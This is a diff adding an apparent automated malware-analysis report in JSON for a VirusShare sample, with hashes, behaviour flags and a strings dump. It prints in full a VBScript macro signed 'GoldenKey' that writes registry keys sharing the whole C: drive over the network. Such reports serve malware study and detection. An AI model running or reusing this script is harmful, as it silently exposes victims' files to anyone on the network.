@@ -1,0 +1,44 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "CreateObject": "May create an OLE object",
+            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
+            "Shell": "May run an executable file or a system command",
+            "WScript.Shell": "May run an executable file or a system command",
+            "Windows": "May enumerate application windows"
+        },
+        "macro": "Set WSHShell = WScript.CreateObject(\"WScript.Shell\")\nWSHShell.RegWrite \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Network\\LanMan\\!\\Flags\", 402, \"REG_DWORD\"\nWSHShell.RegWrite \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Network\\LanMan\\!\\Type\", 0, \"REG_DWORD\"\nWSHShell.RegWrite \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Network\\LanMan\\!\\Path\", \"C:\\\"\nWSHShell.RegWrite \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Network\\LanMan\\!\\Parm1enc\", -1837192444, \"REG_BINARY\"\nWSHShell.RegWrite \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Network\\LanMan\\!\\Remark\", \"GoldenKey\"\n'GoldenKey By Lys Kovick"
+    },
+    "filename": "VirusShare_8fae6113d68641f9d158e939883f5d84",
+    "filesize": 686,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "8fae6113d68641f9d158e939883f5d84",
+        "sha1": "1cc626f095024f6d894ea5e107d642e3cceda604",
+        "sha256": "6c03a13982cb485287b4ece167c169856fe87c602357969b05b31abc4c0ba2ba"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "Set WSHShell = WScript.CreateObject(\"WScript.Shell\")",
+            "WSHShell.RegWrite \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Network\\LanMan\\!\\Flags\", 402, \"REG_DWORD\"",
+            "WSHShell.RegWrite \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Network\\LanMan\\!\\Type\", 0, \"REG_DWORD\"",
+            "WSHShell.RegWrite \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Network\\LanMan\\!\\Path\", \"C:\\\"",
+            "WSHShell.RegWrite \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Network\\LanMan\\!\\Parm1enc\", -1837192444, \"REG_BINARY\"",
+            "WSHShell.RegWrite \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Network\\LanMan\\!\\Remark\", \"GoldenKey\"",
+            "'GoldenKey By Lys Kovick"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.353401",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
